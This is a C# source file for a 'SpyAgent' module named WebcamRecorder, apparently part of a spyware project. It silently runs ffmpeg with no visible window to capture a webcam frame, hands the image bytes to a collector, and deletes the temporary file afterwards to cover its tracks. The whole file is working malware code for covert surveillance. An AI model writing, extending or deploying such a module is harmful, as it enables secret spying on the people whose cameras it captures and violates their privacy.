namespace SpyAgent.Modules;

using System.Diagnostics;
using SpyAgent.Core;

internal sealed class WebcamRecorder : ISpyModule
{
    public string ModuleName => "Webcam";

    public async Task<byte[]?> CollectAsync()
    {
        var outputPath = Path.Combine(Path.GetTempPath(), $"cam_{Guid.NewGuid():N}.jpg");

        try
        {
            var ffmpegPath = LocateFfmpeg();
            if (ffmpegPath is null)
                return null;

            var psi = new ProcessStartInfo
            {
                FileName = ffmpegPath,
                Arguments = $"-f dshow -i video=\"Integrated Webcam\" -frames:v 1 -y \"{outputPath}\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardError = true
            };

            using var process = Process.Start(psi);
            if (process is null) return null;

            await process.WaitForExitAsync();

            if (File.Exists(outputPath) && new FileInfo(outputPath).Length > 0)
                return await File.ReadAllBytesAsync(outputPath);

            return null;
        }
        finally
        {
            if (File.Exists(outputPath))
                File.Delete(outputPath);
        }
    }

    private static string? LocateFfmpeg()
    {
        var candidates = new[]
        {
            Path.Combine(AppContext.BaseDirectory, "ffmpeg.exe"),
            @"C:\ffmpeg\bin\ffmpeg.exe",
            @"C:\Program Files\ffmpeg\bin\ffmpeg.exe"
        };

        return candidates.FirstOrDefault(File.Exists);
    }
}
